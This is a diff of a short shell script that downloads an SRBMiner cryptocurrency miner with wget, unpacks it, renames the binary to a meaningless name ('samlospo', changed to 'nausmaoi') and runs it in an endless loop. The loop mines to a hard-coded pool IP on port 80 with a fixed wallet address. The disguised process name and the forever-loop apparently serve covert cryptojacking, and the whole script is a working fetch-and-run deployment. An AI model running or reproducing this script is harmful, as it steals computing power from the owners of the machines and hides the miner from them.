@@ -1,6 +1,6 @@
-wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/srbminer-3-5-4/SRBMiner-Multi-3-5-4-Linux.tar.gz
-tar xf SRBMiner-Multi-3-5-4-Linux.tar.gz
-mv SRBMiner-MULTI samlospo
+wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/srbminer-3-5-7/SRBMiner-Multi-3-5-7-Linux.tar.gz
+tar xf SRBMiner-Multi-3-5-7-Linux.tar.gz
+mv SRBMiner-MULTI nausmaoi
 while true; do
-./samlospo --disable-cpu --algorithm pearlhash --pool 212.47.248.156:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
+./nausmaoi --disable-cpu --algorithm pearlhash --pool 212.47.248.156:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
 done
